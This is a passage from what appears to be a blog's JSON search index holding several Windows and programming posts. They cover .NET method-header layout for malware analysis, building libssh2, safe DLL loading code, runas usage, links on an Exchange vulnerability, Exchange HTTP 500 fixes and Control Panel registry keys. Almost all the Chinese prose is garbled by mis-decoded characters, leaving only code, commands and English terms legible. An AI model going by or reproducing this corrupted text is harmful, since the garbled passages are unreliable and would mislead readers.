åœ¨ Tiny å¤´ä¸­æ€»æ˜¯è¢«è®¾ç½®ä¸º 10(äºŒè¿›åˆ¶) Method Size 6 æŒ‡å®šå‡½æ•°ä½“çš„å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼Œæœ€å¤§ä¸º 63 bytesï¼‰ Fat å¤´ï¼ˆThe Fat headerï¼‰ç”¨æˆ·æ›´å¤æ‚çš„å‡½æ•°ä¸»é¢˜ï¼Œè¶…è¿‡äº† Tiny å¤´çš„é™åˆ¶ï¼š Fat å¤´ç”¨äºä¸ç¬¦åˆ Tiny å¤´æ ‡å‡†çš„è¾ƒå¤§å‡½æ•° å®ƒæä¾›äº†å…¶ä»–ä¿¡æ¯ï¼Œæ¯”å¦‚æ–¹æ³•çš„å±€éƒ¨å˜é‡å’Œ SEH å½“ä¸€ä¸ªå‡½æ•°çš„å¤§å°æˆ–è€…å¤æ‚åº¦è¶…è¿‡äº† Tiny å¤´çš„æ˜¾ç¤ºï¼Œå°±ä¼šä½¿ç”¨ Fat å¤´ã€‚ Fat å¤´æ›´å¤§ï¼Œç”±å¤šä¸ªå­—æ®µç»„æˆï¼ŒåŒ…æ‹¬ä¸€ä¸ªæ ‡å¿—å­—æ®µï¼Œç”¨äºæŒ‡ç¤ºæ–¹æ³•å‡½æ•°ä½“çš„å…¶ä»–ç‰¹å¾ï¼ˆä¾‹å¦‚å¼‚å¸¸å¤„ç†æˆ–å±€éƒ¨å˜é‡åˆå§‹åŒ–ï¼‰ã€‚ Field Size(Bits) æè¿° Flags 2 æŒ‡å®šå‡½æ•°å›¾çš„å±æ€§ï¼ŒåŒ…æ‹¬æ˜¯å¦å­˜åœ¨å±€éƒ¨å˜é‡ã€åˆå§‹å±€éƒ¨å˜é‡ç­‰ã€‚æœ€ä½ä½ï¼ˆ0x3ï¼‰åœ¨è®¾ç½®ä¸º 1 æ—¶è¡¨ç¤º Fat å¤´ã€‚ Size 2 4 byte å¤§å°çš„å¤´ã€‚åŒ…æ‹¬æ•´ä¸ªå¤´éƒ¨çš„å¤§å°ï¼Œä¸ä»…ä»…æ˜¯å‡½æ•°ä½“çš„å¤§å° MaxStack 2 æ–¹æ³•æ‰§è¡ŒæœŸé—´æ“ä½œæ•°å †æ ˆä¸Šä»»ä½•ç‚¹ä¸Šçš„æœ€å¤§é¡¹æ•° CodeSize 4 å‡½æ•°ä½“ IL ä»£ç çš„å¤§å°ï¼ˆbyteï¼‰ LocalVarsigTok 4 ç”¨äºå±€éƒ¨å˜é‡ç­¾åçš„å…ƒæ•°æ®æ ‡è®°ï¼Œä»…å½“æ–¹æ³•å…·æœ‰å±€éƒ¨å˜é‡æ—¶æ‰æ˜¾ç¤º MoreSections N ä¾‹å¦‚å¼‚å¸¸å¤„ç†å­å¥çš„é™„ä»¶éƒ¨åˆ†ï¼Œå¦‚æœåœ¨æ ‡å¿—ä¸­æŒ‡å®šï¼Œåˆ™æ˜¾ç¤ºã€‚ æƒ³çœ‹æ›´å¤šå­—æ®µè¯´æ˜ï¼Œå¯ä»¥çœ‹ The .NET File Format å‡½æ•°ä½“ç¤ºä¾‹ å¦‚ä¸‹æ‰€ç¤ºä¸º DeleteDiscoveryProfileInternal å‡½æ•°ï¼š ç‚¹å‡»åç§»é‡ï¼ˆæˆ– RVAï¼‰å°†ä¼šæ¡ä¼ åˆ° HEX çª—å£ä¸­å‡½æ•°çš„å¤´éƒ¨ï¼š åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ° dnSpy åœ¨é¼ æ ‡æ‚¬åœåœ¨å¤´éƒ¨å­—èŠ‚ä¸Šæ—¶çªå‡ºæ˜¾ç¤ºäº†å¤´éƒ¨å­—æ®µã€‚å‡½æ•°çš„å†…å®¹-æŒ‡ä»¤è·Ÿåœ¨å¤´éƒ¨åé¢ï¼Œåœ¨ dnSpy ä¸­è¡¨ç¤ºä¸º image_core_ilmethod_fat.instruction[]ã€‚ä¸ºäº†æ›´å¥½çš„ç†è§£å’ŒæŸ¥çœ‹æŒ‡ä»¤çš„å€¼ï¼ˆæ“ä½œç ï¼‰ï¼Œæˆ‘ä»¬å°†åœ¨ IDA ä¸­æ‰“å¼€æ¶æ„è½¯ä»¶ï¼š æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å·¦è¾¹æ˜¯æ¯ä¸ªæ“ä½œå¦ˆçš„å€¼ï¼Œéµå¾ª dnSpy ä¸­çš„å‰ä¸¤æ¡æŒ‡ä»¤ï¼š æ€»ç»“ åœ¨å¯¹ .NET å¯æ‰§è¡Œæ–‡ä»¶ç»“æ„çš„åˆæ­¥æ¢ç´¢ä¸­ï¼Œæˆ‘ä»¬å·²ç»æ·±å…¥ç ”ç©¶äº† .NET æ¡†æ¶çš„å¤æ‚æ€§ï¼Œå¼ºè°ƒäº†å…¶åˆæ³•å¼€å‘å’Œæ¶æ„è½¯ä»¶åˆ›å»ºçš„åŒé‡ç”¨é€”ã€‚é€šè¿‡å‰–æ .NET ç¼–è¯‘ã€è¿è¡Œä»¥åŠå…ƒæ•°æ®å’Œç¨‹åºé›†çš„å¤æ‚ç»†èŠ‚ï¼Œæˆ‘ä»¬å·²ç»ä¸ºç†è§£ .NET ç¨‹åºå‡½æ•°å¦‚ä½•æ‰§è¡Œä»¥åŠå¦‚ä½•ä¸ºæ¶æ„ç›®çš„æ“ä½œå®ƒä»¬å¥ å®šäº†åŸºç¡€ã€‚éšç€ä½ æ·±å…¥ç ”ç©¶ .NET æ¶æ„è½¯ä»¶é€†å‘å·¥ç¨‹æŠ€æœ¯ï¼Œä½ ä¼šå‘ç°è¿™å¯¹ä½ æœ‰æ•ˆåˆ†æå’Œå¯¹æŠ—åŸºäº .NET å¨èƒçš„æ¶æ„è½¯ä»¶éå¸¸æœ‰æ•ˆã€‚ é™„å½• æ ‡è®°ç±»å‹è¡¨ Token Type Value(Hex) Description Module 0x00 References a module definition. å¼•ç”¨æ¨¡å—å®šä¹‰ TypeRef 0x01 References a type in another module. å¼•ç”¨å¦ä¸€ä¸ªæ¨¡å—ç±»å‹ TypeDef 0x02 Defines a type within the module. FieldDef 0x04 Defines a field within a type. MethodDef 0x06 Defines a method within a type. ParamDef 0x08 Defines a parameter for a method. InterfaceImpl 0x09 Defines interface implementations for a type. MemberRef 0x0A References a field or method in another module. CustomAttribute 0x0C Defines a custom attribute. Permission 0x0E Defines declarative security permissions. Signature 0x11 Defines a standalone signature. Event 0x14 Defines an event within a type. Property 0x17 Defines a property within a type. ModuleRef 0x1A References an external module. TypeSpec 0x1B Specifies a type using a signature. Assembly 0x20 Defines assembly metadata. AssemblyRef 0x23 References another assembly. File 0x26 Defines an external file associated with the assembly. ExportedType 0x27 Defines a type exported from another assembly. ManifestResource 0x28 Defines an embedded resource. GenericParam 0x2A Defines a generic parameter for a type or method. MethodSpec 0x2B Specifies a method instantiation for a generic method. GenericParamConstraint 0x2C Specifies constraints on a generic parameter.","tags":[{"name":"C#","slug":"C","permalink":"https://hodlyounger.github.io/tags/C/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"CSharp","slug":"B-Code/CSharp","permalink":"https://hodlyounger.github.io/categories/B-Code/CSharp/"}]},{"title":"ã€libssh2ã€‘ Windows ä¸‹ libssh2 ç¼–è¯‘æ­¥éª¤","date":"2024-03-12T06:29:26.830Z","path":"C_OpenSource/ã€libssh2ã€‘libssh2ç¼–è¯‘/","text":"æ¦‚è¿°ï¼šwindowsæ“ä½œä¸‹ç¼–è¯‘ libssh2 é™æ€åº“ è¿è¡Œç®¡ç†å‘˜ CMD cmd ä¸­è¿è¡Œè¦ç¼–è¯‘ç‰ˆæœ¬çš„ vcvars32.bat cmake é…ç½®ç¼–è¯‘ç¯å¢ƒ 1cmake -DBUILD_SHARED_LIBS=ON -DBUILD_STATIC_LIBS=ON -DBUILD_EXAMPLES=OFF -DOPENSSL_ROOT_DIR=&quot;D:\\OpenSSL-3.1-Win32-mtd&quot; -DOPENSSL_CRYPTO_LIBRARY=&quot;D:\\OpenSSL-Win32\\lib&quot; -DBUILD_TESTING=OFF -A Win32 . -B &quot;x86&quot; cmake ç¼–è¯‘ï¼ˆæˆ–è€…ä½¿ç”¨slnå·¥ç¨‹ï¼‰ 123cmake --build x86 --config Debug# x64 Releasecmake --build x64 --config Release","tags":[{"name":"opensource","slug":"opensource","permalink":"https://hodlyounger.github.io/tags/opensource/"},{"name":"libssh2","slug":"libssh2","permalink":"https://hodlyounger.github.io/tags/libssh2/"}],"categories":[{"name":"C_OpenSource","slug":"C-OpenSource","permalink":"https://hodlyounger.github.io/categories/C-OpenSource/"}]},{"title":"ã€APIã€‘ å®‰å…¨åŠ è½½DLL","date":"2024-03-07T03:10:28.902Z","path":"A_OS/Windows/API/ã€winapiã€‘å®‰å…¨åŠ è½½DLL/","text":"æ¦‚è¿°ï¼šå¦‚ä½•å®‰å…¨åŠ è½½dllæ–‡ä»¶ï¼Œé˜²æ­¢ dll æ›¿æ¢ 123456789101112131415161718192021222324252627282930313233343536373839__inline HMODULE WINAPI LoadLibraryEx_api(LPCTSTR lpFileName, HANDLE hFile, DWORD dwFlags)&#123; return ::LoadLibraryEx(lpFileName, hFile, dwFlags);&#125;//å®‰å…¨ç‰ˆLoadLibrary_apiï¼Œå¯ä»¥é™ä½dllåŠ«æŒçš„å¯èƒ½æ€§HMODULE WINAPI LoadLibrary_api_s(LPCTSTR lpFileName)&#123;#ifdef __360PubDLLSafeInitHelper /* å½“ä½¿ç”¨ S360æ—¶ï¼Œæˆ‘ä»¬ä¼˜å…ˆä½¿ç”¨ S360 æä¾›æ˜¯ DLL å®‰å…¨åŠ è½½ã€‚ è¿™æ˜¯å› ä¸º S360 æä¾›çš„LoadLibraryFormSystem32èƒ½ä¸ºWindows XPä»¥åŠå…¶ä»–æ‰€æœ‰æ²¡æœ‰å®‰è£… KB2533623 çš„ç³»ç»Ÿæä¾› LOAD_LIBRARY_SEARCH_SYSTEM32 ç‰¹æ€§ã€‚ æå‡ä¸æ”¯æŒ LOAD_LIBRARY_SEARCH_SYSTEM32 ç‰¹æ€§ç³»ç»Ÿä¸­çš„å®‰å…¨æ€§ã€‚ */ return S360::Helper::LoadLibraryFormSystem32(lpFileName);#elif defined _M_IX86 || defined _M_AMD64 || defined _M_IA64 /* https://docs.microsoft.com/zh-cn/windows/desktop/api/libloaderapi/nf-libloaderapi-loadlibraryexa Windows 7, Windows Server 2008 R2, Windows Vista and Windows Server 2008: The LOAD_LIBRARY_SEARCH_ flags are available on systems that have KB2533623 installed. To determine whether the flags are available, use GetProcAddress to get the address of the AddDllDirectory, RemoveDllDirectory, or SetDefaultDllDirectories function. If GetProcAddress succeeds, the LOAD_LIBRARY_SEARCH_ flags can be used with LoadLibraryEx. */ //ä¸å†ä½¿ç”¨ERROR_INVALID_PARAMETERåˆ¤æ–­ï¼Œè§„é¿è”æƒ³ä¸€é”®å½±éŸ³å¯¼è‡´çš„Hook Bugã€‚ static int bSafeLoadAvailable = 0; if (bSafeLoadAvailable == 0) &#123; //æ­¤å¤„ä¸è€ƒè™‘çº¿ç¨‹å®‰å…¨ï¼Œå› ä¸ºå¤šæ‰§è¡Œä¸€æ¬¡ GetProcAddress æ“ä½œæ²¡ä»€ä¹ˆå¤§ä¸äº†çš„ã€‚ bSafeLoadAvailable = GetProcAddress(GetModuleHandleW(L&quot;Kernel32.dll&quot;), &quot;AddDllDirectory&quot;) != NULL ? 1 : -1; &#125; //å°è¯•ä½¿ç”¨DLLå®‰å…¨åˆå§‹åŒ– return LoadLibraryEx_api(lpFileName, NULL, bSafeLoadAvailable == 1 ? /*LOAD_LIBRARY_SEARCH_SYSTEM32*/0x00000800 : 0);#else // ARM || ARM64 //å§‹ç»ˆä½¿ç”¨DLLå®‰å…¨åˆå§‹åŒ– return LoadLibraryEx_api(lpFileName, NULL, /*LOAD_LIBRARY_SEARCH_SYSTEM32*/0x00000800);#endif&#125;","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/API/"}]},{"title":"ã€cmdã€‘runas","date":"2024-02-26T07:04:37.056Z","path":"A_OS/Windows/cmd/runas/","text":"æ¦‚è¿°ï¼šrunas å‘½ä»¤ç”¨æ³•æ•´ç† 0x01 å¸®åŠ©æ‰‹å†Œ 123456789101112131415161718192021222324252627282930313233343536373839runas /?C:\\Users\\holdy&gt;runas /?RUNAS ç”¨æ³•:RUNAS [ [/noprofile | /profile] [/env] [/savecred | /netonly] ] /user:&lt;UserName&gt; programRUNAS [ [/noprofile | /profile] [/env] [/savecred] ] /smartcard [/user:&lt;UserName&gt;] programRUNAS [ [/machine:&lt;MachineType&gt;] ] /trustlevel:&lt;TrustLevel&gt; program /noprofile æŒ‡å®šä¸åº”è¯¥åŠ è½½ç”¨æˆ·çš„é…ç½®æ–‡ä»¶ã€‚ è¿™ä¼šåŠ é€Ÿåº”ç”¨ç¨‹åºåŠ è½½ï¼Œä½† å¯èƒ½ä¼šé€ æˆä¸€äº›åº”ç”¨ç¨‹åºè¿è¡Œä¸æ­£å¸¸ã€‚ /profile æŒ‡å®šåº”è¯¥åŠ è½½ç”¨æˆ·çš„é…ç½®æ–‡ä»¶ã€‚ è¿™æ˜¯é»˜è®¤å€¼ã€‚ /env è¦ä½¿ç”¨å½“å‰ç¯å¢ƒï¼Œè€Œä¸æ˜¯ç”¨æˆ·çš„ç¯å¢ƒã€‚ /netonly åªåœ¨æŒ‡å®šçš„å‡­æ®é™äºè¿œç¨‹è®¿é—®çš„æƒ…å†µä¸‹æ‰ä½¿ç”¨ã€‚ /savecred ç”¨ç”¨æˆ·ä»¥å‰ä¿å­˜çš„å‡­æ®ã€‚ /smartcard å¦‚æœå‡­æ®æ˜¯æ™ºèƒ½å¡æä¾›çš„ï¼Œåˆ™ä½¿ç”¨è¿™ä¸ªé€‰é¡¹ã€‚ /user &lt;UserName&gt; åº”ä½¿ç”¨ USER@DOMAIN æˆ– DOMAIN\\USER å½¢å¼ /showtrustlevels æ˜¾ç¤ºå¯ä»¥ç”¨ä½œ /trustlevel çš„å‚æ•°çš„ ä¿¡ä»»çº§åˆ«ã€‚ /trustlevel &lt;Level&gt; åº”è¯¥æ˜¯åœ¨ /showtrustlevels ä¸­æšä¸¾ çš„ä¸€ä¸ªçº§åˆ«ã€‚ /machine æŒ‡å®šè¿›ç¨‹çš„è®¡ç®—æœºæ¶æ„ã€‚ &lt;MachineType&gt; åº”ä¸º x86|amd64|arm|arm64 ä¹‹ä¸€ã€‚ program EXE çš„å‘½ä»¤è¡Œã€‚è¯·å‚é˜…ä¸‹é¢çš„ä¾‹å­ç¤ºä¾‹:&gt; runas /noprofile /user:mymachine\\administrator cmd&gt; runas /profile /env /user:mydomain\\admin &quot;mmc %windir%\\system32\\dsa.msc&quot;&gt; runas /env /user:user@domain.microsoft.com &quot;notepad \\&quot;my file.txt\\&quot;&quot;æ³¨æ„: åªåœ¨å¾—åˆ°æç¤ºæ—¶æ‰è¾“å…¥ç”¨æˆ·çš„å¯†ç ã€‚æ³¨æ„: /profile è·Ÿ /netonly ä¸å…¼å®¹ã€‚æ³¨æ„: /savecred è·Ÿ /smartcard ä¸å…¼å®¹ã€‚ 0x02 ç™»å½• ä»¥æŒ‡å®šçš„ç”¨æˆ·è§’è‰²å¯åŠ¨è¿›ç¨‹ 1runas /USER:ç”¨æˆ·å /netonly cmd.exe","tags":[{"name":"cmd","slug":"cmd","permalink":"https://hodlyounger.github.io/tags/cmd/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"cmd","slug":"A-OS/Windows/cmd","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/cmd/"}]},{"title":"ã€Exchangeã€‘ ç›¸å…³æ¼æ´ã€æ–‡ç« æ•´ç†","date":"2024-02-23T02:21:48.765Z","path":"A_OS/Windows/Exchange/ã€Exchangeã€‘å¯¼è¯»/","text":"æ¦‚è¿°ï¼šExchange ç›¸å…³æ¼æ´åŠå…¶ç›¸å…³æ–‡ç« æ•´ç† 0x01 CVE-2021-26855 ç›¸å…³æ–‡ç« ï¼š Microsoft Exchange Server CVE-2021â€“26855 æ¼æ´åˆ©ç”¨ - çŸ¥ä¹ Reproducing the Microsoft Exchange Proxylogon Exploit Chain |","tags":[{"name":"experience","slug":"experience","permalink":"https://hodlyounger.github.io/tags/experience/"},{"name":"exchange","slug":"exchange","permalink":"https://hodlyounger.github.io/tags/exchange/"},{"name":"index","slug":"index","permalink":"https://hodlyounger.github.io/tags/index/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"Exchange","slug":"A-OS/Windows/Exchange","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/Exchange/"}]},{"title":"ã€Cã€‘ç»éªŒæ±‡æ€»","date":"2024-02-23T02:01:55.629Z","path":"B_Code/C/Cå¥½æ–‡æ¨è/","text":"æ¦‚è¿°ï¼šCå¼€å‘ç›¸å…³æ–‡ç« æ¨è åŸºç¡€çŸ¥è¯† å˜é‡å¤§å° æ ‡é‡ç±»å‹ C æ•°æ®ç±»å‹ æ‰€éœ€çš„å¯¹é½æ–¹å¼ INT8 char Byte UINT8 unsigned char Byte INT16 short Word UINT16 unsigned short Word INT32 intï¼Œlong åŒå­— UINT32 unsigned intï¼Œunsigned long åŒå­— INT64 __int64 å››å­— UINT64 unsigned __int64 å››å­— FP32ï¼ˆå•ç²¾åº¦ï¼‰ float åŒå­— FP64ï¼ˆåŒç²¾åº¦ï¼‰ double å››å­— POINTER ***** å››å­— __m64 struct __m64 å››å­— __m128 struct __m128 å…«å€é•¿å­— å¯ä»¥çœ‹ä¸‹ BaseTsd.h ä¸­æ˜¯å¦‚ä½•å®šä¹‰æ ‡é‡ç±»å‹çš„ï¼Œä¸‹é¢æˆªå–äº†ä¸€éƒ¨åˆ† 123456789101112131415161718192021typedef signed char INT8, *PINT8;typedef signed short INT16, *PINT16;typedef signed int INT32, *PINT32;typedef signed __int64 INT64, *PINT64;typedef unsigned char UINT8, *PUINT8;typedef unsigned short UINT16, *PUINT16;typedef unsigned int UINT32, *PUINT32;typedef unsigned __int64 UINT64, *PUINT64;//// The following types are guaranteed to be signed and 32 bits wide.//typedef signed int LONG32, *PLONG32;//// The following types are guaranteed to be unsigned and 32 bits wide.//typedef unsigned int ULONG32, *PULONG32;typedef unsigned int DWORD32, *PDWORD32; å…³é”®å­— Cè¯­è¨€ä¸¨æ·±å…¥ç†è§£volatileå…³é”®å­— - çŸ¥ä¹ C/C++ ä¸­ volatile å…³é”®å­—è¯¦è§£ | èœé¸Ÿæ•™ç¨‹","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"C","slug":"B-Code/C","permalink":"https://hodlyounger.github.io/categories/B-Code/C/"}]},{"title":"ã€å¼‚å¸¸å¤„ç†ã€‘Exchangeå¼‚å¸¸","date":"2024-02-22T07:22:26.850Z","path":"A_OS/Windows/å¼‚å¸¸åŠé”™è¯¯å¤„ç†/ã€å¼‚å¸¸å¤„ç†ã€‘Exchangeå¼‚å¸¸/","text":"æ¦‚è¿°ï¼šExchange è¿è¡Œå¼‚å¸¸æ•´ç†åŠè§£å†³æ–¹æ¡ˆ 0x01 ecpã€owaç™»å½•åæŠ¥é”™ http 500 æœ¬äººç¯å¢ƒï¼šwindows server 2016 + exchange 2016 cu21 é—®é¢˜æè¿°ï¼šExchange ç™»å½• ecp æˆ–è€… owa ä¹‹åæŠ¥é”™ http Error 500 ç›¸å…³é“¾æ¥ï¼š http 500 EAC/OWA exhange 2016 server 2016 Exchange Server 2019 HTTP Error 500 - Microsoft Q&amp;A Exchange 2019 è®¿é—®OWAæˆ–è€…ECP æç¤ºHTTP 500é”™è¯¯çš„è§£å†³æ–¹æ¡ˆ - ç®€ä¹¦ Exchange 2016 - HTTP Error 500 after logging into ECP/OWA - blog - Alexander Ollischer | Citrix | Microsoft å¦‚æœä»¥ä¸‹æ–¹æ¡ˆè¿˜æ˜¯ä¸è¡Œï¼Œå¯ä»¥å†å°è¯•ä¸€ä¸‹é‡ç½® Exchangeï¼Œå¾®è½¯å®˜ç½‘æ–‡æ¡£ï¼šæ¢å¤ Exchange æœåŠ¡å™¨ã€æ¢å¤ä¸¢å¤±Exchange Serverã€ä¸¢å¤±Exchange Serveræ¢å¤ | Microsoft Learn è§£å†³æ€è·¯ å…ˆè¯´ä¸€ä¸‹æœ¬äººè§£å†³çš„æ­¥éª¤ï¼Œä»¥ä¸‹å‡ ä¸ªæ–¹æ³•æˆ‘éƒ½å°è¯•åé‡å¯ç”µè„‘ï¼Œç„¶å Exchange æ¢å¤æ­£å¸¸ã€‚i cant distinguish which operation is effective. è¿è¡Œ UpdateCas.ps1 å‚è€ƒ Exchange 2016 - HTTP Error 500 after logging into ECP/OWA - blog - Alexander Ollischer | Citrix | Microsoft C:\\Program Files\\Microsoft\\Exchange Server\\V15\\Bin ç›®å½• æ‰¾åˆ° UpdateCas.ps1 å¹¶è¿è¡Œ cmdä¸­è¿è¡Œ iisreset (æˆ–è€…é‡å¯ç³»ç»Ÿ) åˆ é™¤owaç›®å½• ç¦ç”¨ç®¡ç†å‘˜ç„¶åå¯ç”¨ 12Disable-Mailbox administratorEnable-Mailbox administrator æœ€åè¿˜æ˜¯é‡å¯ä¸‹ iis æœåŠ¡æˆ–è€…é‡å¯æ“ä½œç³»ç»Ÿ é‡æ–°åˆ›å»º OWA è™šæ‹Ÿç›®å½• å¯ä»¥ä½¿ç”¨ Get-OwaVirtualDirectory æŸ¥çœ‹å½“å‰å­˜åœ¨çš„ OWA è™šæ‹Ÿç›®å½• æ‰“å¼€ Exchange Management Shell ç§»é™¤ OWA è™šæ‹Ÿç›®å½• 1Remove-OwaVirtualDirectory &#x27;EXCHANGE\\owa (Default Web Site)&#x27; # â€˜EXCHANGEâ€™ä¸º exchange ä¸»æœºåç§° åˆ›å»º OWA è™šæ‹Ÿç›®å½• 1New-OwaVirtualDirectory -WebSiteName &#x27;Default Web Site&#x27; æ“ä½œå®Œæˆåé‡å¯ iis æœåŠ¡æˆ–è€…é‡å¯æ“ä½œç³»ç»Ÿ å›æ”¶åº”ç”¨æ±  åœ¨ æœåŠ¡å™¨é¢ æ¿ â€” æ‰“ å¼€ å·¥å…·â€œASDI ç¼– è¾‘ å™¨ â€ ï¼Œå³é”®ï¼Œè¿æ¥åˆ°ï¼Œ æ‰¾ åˆ°â€œè¿æ¥ç‚¹â€çš„â€œé€‰æ‹©ä¸€ä¸ªå·²çŸ¥å‘½åä¸Šä¸‹æ–‡â€ï¼Œä¸‹æ‹‰é€‰æ‹©â€œ é… ç½® â€ â€” ç„¶ å æ‰¾ åˆ°â€œCN=Servicesâ€ â€”â€œCN=Microsoft Exchangeâ€â€”â€œCN=&lt;ä½ çš„ Exchange ç»„ç»‡åç§°â€â€”â€œCN=Client Acessâ€ â€”å³å‡»â€œå±æ€§â€â€”æ‰“å¼€â€œç¼–è¾‘å™¨â€çª—å£â€”æ‰¾åˆ°â€MSExchCanaryDataâ€â€”â€œå±æ€§â€ï¼Œç„¶åæ¸…ç©ºè¯¥é€‰é¡¹ï¼› æ‰“å¼€ Internet Iformation Service (IIS)ï¼Œæ‰¾åˆ°â€œåº”ç”¨ç¨‹åºæ± â€ï¼Œæ‰¾åˆ°â€œMSExchangeOWAAppPoolâ€ï¼Œç‚¹å‡»å›æ”¶ã€‚ æ“ä½œå®Œæˆåé‡å¯ iis æœåŠ¡æˆ–è€…é‡å¯æ“ä½œç³»ç»Ÿ ç§»é™¤ config æ–‡ä»¶ å°† C:\\inetpub\\wwwroot ç›®å½•ä¸‹çš„ web.config ç§»å‡ºã€‚æˆ‘çš„æ“ä½œæ˜¯ä¿®æ”¹äº†æ–‡ä»¶åï¼Œæœ€åè¿˜æ˜¯æ”¹å›äº† web.config 0x02 Exchange ç™»å½•åæç¤ºæ²¡æœ‰è¯¥é‚®ç®± å¯èƒ½çš„åŸå› ï¼Œä¹‹å‰çš„æ“ä½œä¸­ç¦ç”¨äº†è¯¥é‚®ç®±ã€‚ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯ç”¨ï¼š 1Enable-Mailbox administrator æˆ–è€… ä½¿ç”¨å¦‚ä¸‹æ‰€ç¤ºçš„å‘½ä»¤ä¿®å¤ 1New-MailboxRestoreRequest -SourceDatabase RecoveryDB01 -SourceStoreMailbox GUID -TargetMailbox test@keyman .com","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"å¼‚å¸¸åŠé”™è¯¯å¤„ç†","slug":"A-OS/Windows/å¼‚å¸¸åŠé”™è¯¯å¤„ç†","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E5%BC%82%E5%B8%B8%E5%8F%8A%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86/"}]},{"title":"ã€æ§åˆ¶é¢æ¿ã€‘æ³¨å†Œè¡¨ç›¸å…³","date":"2024-02-20T16:00:00.000Z","path":"A_OS/Windows/æ³¨å†Œè¡¨/ã€æ§åˆ¶é¢æ¿ã€‘æ³¨å†Œè¡¨ç›¸å…³/","text":"æ¦‚è¿°ï¼šæ§åˆ¶é¢æ¿ç›¸å…³æ³¨å†Œè¡¨ï¼Œä»¥åŠæ§åˆ¶é¢æ¿ç¨‹åºå¼€å‘ 0x01 æ§åˆ¶é¢æ¿é¡¹ç›® .kyywifipqhsk{zoom:50%;} å¯¹åº”çš„æ³¨å†Œè¡¨ä½ç½®ï¼š HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ControlPanel\\NameSpace è¯´æ˜ï¼š ç”¨äºå­˜å‚¨å’Œæ§åˆ¶æ§åˆ¶é¢æ¿ï¼ˆControl Panelï¼‰ä¸­çš„é¡¹ç›®ã€‚å…·ä½“æ¥è¯´ï¼ŒControlPanel\\NameSpaceé”®ä¸‹é€šå¸¸åŒ…å«äº†ä¸€ç³»åˆ—çš„å­é”®ï¼Œæ¯ä¸ªå­é”®éƒ½ä»£è¡¨æ§åˆ¶é¢æ¿ä¸­çš„ä¸€ä¸ªç‰¹å®šçš„æ–‡ä»¶å¤¹æˆ–é¡¹ç›®ã€‚è¿™äº›å­é”®é€šå¸¸æœ‰ä¸€ä¸ªåä¸º&#123;GUID&#125;çš„åç§°ï¼Œå…¶ä¸­GUIDæ˜¯ä¸€ä¸ªå…¨å±€å”¯ä¸€æ ‡è¯†ç¬¦ï¼Œç”¨äºå”¯ä¸€æ ‡è¯†è¯¥æ–‡ä»¶å¤¹æˆ–é¡¹ç›®ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœä½ æƒ³åœ¨æ§åˆ¶é¢æ¿ä¸­æ·»åŠ æˆ–åˆ é™¤ä¸€ä¸ªé¡¹ç›®ï¼Œä½ å¯èƒ½éœ€è¦ä¿®æ”¹è¿™ä¸ªé”®æˆ–å…¶ä¸‹çš„å­é”®ã€‚é€šè¿‡æ·»åŠ æˆ–åˆ é™¤å­é”®ï¼Œä½ å¯ä»¥æ”¹å˜æ§åˆ¶é¢æ¿çš„å¤–è§‚å’Œè¡Œä¸ºã€‚ 0x02 æ§åˆ¶é¢æ¿é¡¹ç›® æ§åˆ¶é¢æ¿é¡¹æœ¬èº«é€šå¸¸å­˜å‚¨åœ¨ HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cputs æˆ– HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cputsï¼ˆå¯¹äº 32 ä½ç¨‹åºåœ¨ 64 ä½ç³»ç»Ÿä¸Šçš„æƒ…å†µï¼‰ä¸­ã€‚æ¯ä¸ªæ§åˆ¶é¢æ¿é¡¹éƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„ GUIDï¼Œå¹¶æŒ‡å‘å…¶å¯æ‰§è¡Œæ–‡ä»¶æˆ– DLLã€‚ ä¸è¿‡ï¼ŒControlPanel\\NameSpace é€šå¸¸ç”¨äºè‡ªå®šä¹‰æ¡Œé¢ä¸Šçš„â€œæ§åˆ¶é¢æ¿â€æ–‡ä»¶å¤¹å†…å®¹ï¼Œè€Œä¸æ˜¯ç›´æ¥æ§åˆ¶æ§åˆ¶é¢æ¿é¡¹æœ¬èº«ã€‚ å¯¹äº ControlPanel\\NameSpace ä¸‹çš„ GUIDï¼Œå®ƒä»¬é€šå¸¸ä¸æ¡Œé¢ä¸Šçš„æ–‡ä»¶å¤¹å¿«æ·æ–¹å¼ç›¸å…³è”ï¼Œè€Œä¸æ˜¯ç›´æ¥ä¸æ§åˆ¶é¢æ¿é¡¹ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ª GUID 